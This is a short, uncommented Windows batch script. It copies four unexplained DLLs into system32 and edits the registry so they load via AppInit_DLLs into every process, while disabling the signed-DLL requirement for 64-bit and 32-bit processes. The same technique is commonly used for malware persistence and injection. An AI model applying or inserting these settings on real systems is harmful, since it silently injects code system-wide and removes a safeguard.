move C:\users\administrator\desktop\kgsldr.dll C:\windows\system32 
move C:\users\administrator\desktop\kgsldr32.dll C:\windows\system32 
move C:\users\administrator\desktop\kgsgrd.dll C:\windows\system32
move C:\users\administrator\desktop\kgsgrd32.dll C:\windows\system32
reg add "hklm\software\microsoft\windows nt\currentversion\windows" /v LoadAppInit_DLLs /t reg_dword /d 1 /f
reg add "hklm\software\microsoft\windows nt\currentversion\windows" /v RequireSignedAppInit_DLLs /t reg_dword /d 0 /f
reg add "hklm\software\microsoft\windows nt\currentversion\windows" /v AppInit_DLLs /t reg_sz /d "C:\Windows\system32\kgsldr.dll" /f
reg add "hklm\software\wow6432node\microsoft\windows nt\currentversion\windows" /v RequireSignedAppInit_DLLs /t reg_dword /d 0 /f
reg add "hklm\software\wow6432node\microsoft\windows nt\currentversion\windows" /v AppInit_DLLs /t reg_sz /d "C:\Windows\system32\kgsldr32.dll" /f
reg add "hklm\software\wow6432node\microsoft\windows nt\currentversion\windows" /v LoadAppInit_DLLs /t reg_dword /d 1 /f
